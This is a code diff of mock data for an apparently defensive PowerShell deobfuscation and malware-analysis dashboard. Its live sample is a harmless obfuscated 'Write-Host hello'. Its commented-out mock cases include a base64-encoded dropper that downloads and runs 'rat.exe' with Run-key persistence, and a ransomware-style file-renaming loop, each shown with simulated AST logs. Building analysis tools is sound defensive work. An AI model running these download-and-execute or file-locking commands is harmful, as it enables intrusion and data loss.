@@ -4,16 +4,13 @@ export const MOCK_ANALYSIS_RESULT = {
     status: "Malicious",
     threat_level: "High",
     
-    // 1. Script Asli (Obfuscated)
     original_source: `$kxJoS = ([string]::Format('{0}{1}{2}{3}{4}{5}{6}','Wr','ite','-Ho','st h','el','l','o'))
 &('Invoke-Expres'+'sion') $kxJoS`,
 
-    // 2. Hasil Akhir (Deobfuscated)
     deobfuscated_output: `$kxJoS = ([string]"Write-Host hello")
 Write-Host ([string]"hello")`,
 
-    // 3. Raw Log (STRINGIFIED JSON)
-    raw_log: `[
+    raw_log: JSON.stringify([
   {
     "astType": "System.Management.Automation.Language.BinaryExpressionAst",
     "output": {
@@ -136,61 +133,187 @@ Write-Host ([string]"hello")`,
       }
     ]
   }
-]`,
-
-    log_1: `{
-  "Root": "0-123-51746155",
-  "ResultNodeString": {
-    "68-74-13637860": "'st h'",
-    "20-26-2803186": "Format",
-    "56-61-52798982": "'ite'",
-    "0-6-58593350": "$kxJoS",
-    "117-123-43277074": "$kxJoS",
-    "51-55-40956146": "'Wr'",
-    "10-88-25943081": "[string]::Format('{0}{1}{2}{3}{4}{5}{6}','Wr','ite','-Ho','st h','el','l','o')",
-    "75-79-39160569": "'el'",
-    "10-18-61633263": "[string]",
-    "92-116-22260044": "('Invoke-Expres'+'sion')",
-    "0-123-21072725": "$kxJoS = ([string]\\"Write-Host hello\\")\\r\\nWrite-Host ([string]\\"hello\\")",
-    "0-123-51746155": "$kxJoS = ([string]\\"Write-Host hello\\")\\r\\nWrite-Host ([string]\\"hello\\")",
-    "84-87-61392874": "'o'",
-    "0-89-37181318": "$kxJoS = ([string]\\"Write-Host hello\\")",
-    "109-115-33725004": "'sion'",
-    "9-89-66676497": "([string]\\"Write-Host hello\\")",
-    "91-123-9732896": "Write-Host ([string]\\"hello\\")",
-    "27-50-36038983": "'{0}{1}{2}{3}{4}{5}{6}'",
-    "93-108-36415533": "'Invoke-Expres'",
-    "10-88-52006091": "[string]::Format('{0}{1}{2}{3}{4}{5}{6}','Wr','ite','-Ho','st h','el','l','o')",
-    "62-67-56751988": "'-Ho'",
-    "91-123-17904174": "Write-Host ([string]\\"hello\\")",
-    "93-115-25476955": "'Invoke-Expres'+'sion'",
-    "93-115-42900321": "'Invoke-Expres'+'sion'",
-    "10-88-20913496": "[string]::Format('{0}{1}{2}{3}{4}{5}{6}','Wr','ite','-Ho','st h','el','l','o')",
-    "80-83-17559946": "'l'",
-    "9-89-38632461": "([string]::Format('{0}{1}{2}{3}{4}{5}{6}','Wr','ite','-Ho','st h','el','l','o'))",
-    "93-115-66378479": "'Invoke-Expres'+'sion'"
-  },
-  "OriginNodeString": {},
-  "Childs": {}
-}`,
-
-    log_2: `{
-  "Root": "0-16-32803596",
-  "ResultNodeString": {
-    "11-16-53639284": "([string]\\"hello\\")",
-    "0-10-43325585": "Write-Host",
-    "0-16-57865698": "Write-Host ([string]\\"hello\\")",
-    "0-16-10010469": "Write-Host ([string]\\"hello\\")",
-    "0-16-33725855": "Write-Host ([string]\\"hello\\")",
-    "0-16-32803596": "Write-Host ([string]\\"hello\\")"
-  },
-  "OriginNodeString": {},
-  "Childs": {}
-}`
+])
 };
 
-// --- THIS PART WAS MISSING AND CAUSED THE CRASH ---
 export const MOCK_HISTORY = [
     { id: 'CASE-3890', filename: 'invoice_scan.ps1', date: '2024-03-10', status: 'Clean' },
     { id: 'CASE-3889', filename: 'update_fix.bat', date: '2024-03-09', status: 'Malicious' },
 ];
+
+// export const MOCK_ANALYSIS_RESULT = {
+//     jobId: "CASE-9942",
+//     timestamp: new Date().toLocaleString(),
+//     status: "Critical",
+//     threat_level: "High",
+
+//     original_source: `$s = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aXdyIGh0dHA6Ly8xOTIuMTY4LjEuMTAwL3JhdC5leGUgLU91dEZpbGUgQzpcVGVtcFxzdmYuaG9zdC5leGU='))
+// New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Updater" -Value "C:\\Temp\\svf.host.exe"
+// IEX $s`,
+
+//     deobfuscated_output: `Invoke-WebRequest -Uri "http://192.168.1.100/rat.exe" -OutFile "C:\\Temp\\svf.host.exe"
+// New-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Updater" -Value "C:\\Temp\\svf.host.exe"
+// Invoke-Expression "Invoke-WebRequest -Uri http://192.168.1.100/rat.exe -OutFile C:\\Temp\\svf.host.exe"`,
+
+//     raw_log: JSON.stringify([
+//         {
+//             "astType": "System.Management.Automation.Language.InvokeMemberExpressionAst",
+//             "method": "FromBase64String",
+//             "library": "System.Convert",
+//             "argues": [
+//                 { "value": "aXdyIGh0dHA6Ly8xOTIuMTY4LjEuMTAwL3JhdC5leGUgLU91dEZpbGUgQzpcVGVtcFxzdmYuaG9zdC5leGU=", "type": "string" }
+//             ],
+//             "startOffset": 10,
+//             "endOffset": 50
+//         },
+        
+//         {
+//             "astType": "System.Management.Automation.Language.InvokeMemberExpressionAst",
+//             "method": "GetString",
+//             "output": {
+//                 "valueType": "System.String",
+//                 "value": "iwr http://192.168.1.100/rat.exe -OutFile C:\\Temp\\svf.host.exe"
+//             }
+//         },
+
+//         {
+//             "astType": "System.Management.Automation.Language.AssignmentStatementAst",
+//             "variablePath": "s",
+//             "operator": "Equals",
+//             "value": "iwr http://192.168.1.100/rat.exe -OutFile C:\\Temp\\svf.host.exe"
+//         },
+
+//         {
+//             "astType": "System.Management.Automation.Language.CommandAst",
+//             "commandName": "New-ItemProperty",
+//             "argues": [
+//                 { "parameter": "-Path", "value": "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" },
+//                 { "parameter": "-Name", "value": "Updater" }
+//             ]
+//         },
+
+//         {
+//             "astType": "System.Management.Automation.Language.CommandAst",
+//             "commandName": "IEX",
+//             "argues": [
+//                 { "value": "$s", "evaluated": "iwr http://192.168.1.100/rat.exe..." }
+//             ]
+//         },
+
+//         {
+//             "astType": "System.Management.Automation.Language.CommandAst",
+//             "commandName": "Invoke-WebRequest",
+//             "iexOffset": [[0, 100]], // Nested inside the IEX
+//             "argues": [
+//                 { "value": "http://192.168.1.100/rat.exe" },
+//                 { "value": "C:\\Temp\\svf.host.exe" }
+//             ]
+//         },
+
+//         {
+//             "astType": "System.Management.Automation.Language.ParenExpressionAst",
+//             "output": { "value": "Suspicious calculation result" }
+//         }
+//     ])
+// };
+
+// export const MOCK_HISTORY = [
+//     { id: 'CASE-3890', filename: 'invoice_scan.ps1', date: '2024-03-10', status: 'Clean' },
+//     { id: 'CASE-3889', filename: 'update_fix.bat', date: '2024-03-09', status: 'Malicious' },
+// ];
+
+// export const MOCK_ANALYSIS_RESULT = {
+//     jobId: "CASE-5021",
+//     timestamp: new Date().toLocaleString(),
+//     status: "Critical",
+//     threat_level: "High",
+
+//     original_source: `$k = '0x41','0x45','0x53'; $path = [Environment]::GetFolderPath('MyDocuments');
+// $files = gci $path -Recurse -Include *.docx,*.pdf;
+// foreach ($f in $files) { 
+//     $bytes = [IO.File]::ReadAllBytes($f.FullName); 
+//     $enc = [System.Security.Cryptography.Aes]::Create(); 
+//     rn $f.FullName ($f.Name + ".LOCKED") 
+// }`,
+
+//     deobfuscated_output: `$AES_Key_Part = "AES"
+// $TargetFolder = "C:\\Users\\Admin\\Documents"
+// $TargetFiles = Get-ChildItem -Path "C:\\Users\\Admin\\Documents" -Recurse -Include *.docx, *.pdf
+
+// ForEach-Object ($File in $TargetFiles) {
+//     $OriginalBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+//     $Encryptor = [System.Security.Cryptography.Aes]::Create()
+//     Rename-Item -Path $File.FullName -NewName ($File.Name + ".LOCKED")
+// }`,
+
+//     raw_log: JSON.stringify([
+//         // EVENT 1: Environment Variable Access (Reconnaissance)
+//         {
+//             "astType": "System.Management.Automation.Language.InvokeMemberExpressionAst",
+//             "method": "GetFolderPath",
+//             "library": "System.Environment",
+//             "argues": [
+//                 { "value": "MyDocuments", "type": "string" }
+//             ],
+//             "startOffset": 25,
+//             "endOffset": 65
+//         },
+
+//         {
+//             "astType": "System.Management.Automation.Language.CommandAst",
+//             "commandName": "Get-ChildItem", // Alias 'gci' resolved
+//             "category": "Discovery",
+//             "argues": [
+//                 { "parameter": "-Path", "value": "$path" },
+//                 { "parameter": "-Recurse", "value": "true" },
+//                 { "parameter": "-Include", "value": "*.docx,*.pdf" }
+//             ]
+//         },
+
+//         {
+//             "astType": "System.Management.Automation.Language.ForEachStatementAst",
+//             "variablePath": "f",
+//             "iterator": "files",
+//             "output": {
+//                 "valueType": "Loop",
+//                 "value": "Processing file list..."
+//             }
+//         },
+
+//         {
+//             "astType": "System.Management.Automation.Language.InvokeMemberExpressionAst",
+//             "library": "System.IO.File",
+//             "method": "ReadAllBytes",
+//             "argues": [
+//                 { "value": "$f.FullName", "evaluated": "C:\\Users\\Admin\\Documents\\Report.docx" }
+//             ]
+//         },
+
+//         {
+//             "astType": "System.Management.Automation.Language.InvokeMemberExpressionAst",
+//             "library": "System.Security.Cryptography.Aes",
+//             "method": "Create",
+//             "output": {
+//                 "value": "Initializing AES Encryption Provider"
+//             }
+//         },
+
+//         {
+//             "astType": "System.Management.Automation.Language.CommandAst",
+//             "commandName": "Rename-Item", // Alias 'rn' resolved
+//             "commandType": "Cmdlet",
+//             "argues": [
+//                 { "parameter": "-Path", "value": "$f.FullName" },
+//                 { "parameter": "-NewName", "value": "$f.Name + .LOCKED" }
+//             ]
+//         }
+//     ])
+// };
+
+// export const MOCK_HISTORY = [
+//     { id: 'CASE-5021', filename: 'staff_bonus_2024.ps1', date: new Date().toLocaleDateString(), status: 'Critical' },
+//     { id: 'CASE-4999', filename: 'server_maintenance.vbs', date: '2024-12-10', status: 'Suspicious' },
+//     { id: 'CASE-4998', filename: 'printer_driver_install.bat', date: '2024-12-09', status: 'Clean' },
+//     { id: 'CASE-4992', filename: 'unknown_attachment.js', date: '2024-12-08', status: 'Malicious' },
+//     { id: 'CASE-4980', filename: 'deploy_config.ps1', date: '2024-12-05', status: 'Clean' },
+// ];
